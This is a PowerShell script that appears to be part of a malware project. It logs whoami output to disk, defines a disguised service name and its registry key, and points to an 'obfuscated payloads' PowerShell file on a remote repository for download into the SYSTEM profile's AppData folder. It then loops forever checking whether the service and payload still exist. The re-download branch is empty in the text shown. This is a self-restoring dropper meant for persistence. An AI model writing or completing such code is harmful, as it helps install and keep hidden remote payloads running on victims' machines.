Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami_fwd.txt`""

$paths = @(
    "$env:windir\system32\config\systemprofile\AppData\Local"
)

$serviceName = "MyfwdService"
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
$fwdUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/f.ps1"
$initServicefwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$initServicefwdPath = "$initServicefwdPath\init_service_fwd.ps1"
$fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$fwdPath = "$fwdPath\f.ps1"



function Get-ServiceReg{
    param([string]$path)

    $r = Get-Item -Path $path -ErrorAction SilentlyContinue

    if(-not($r)){
        return $true
    }
    return $false
}



function Get-ServiceName{
    param([string]$name)

    try {
        $s = Get-Service -Name $name -ErrorAction SilentlyContinue
        if(-not($s)){
            return $true
        }
        else { return $false }
    }
    catch {
        return $false
    }
    return $false
}




while ($true) {
    $x = Get-ServiceReg -path $regPath
    $y = Get-ServiceName -name $serviceName
    if(-not(Test-Path -Path $fwdPath -PathType Leaf)){
        
    }
}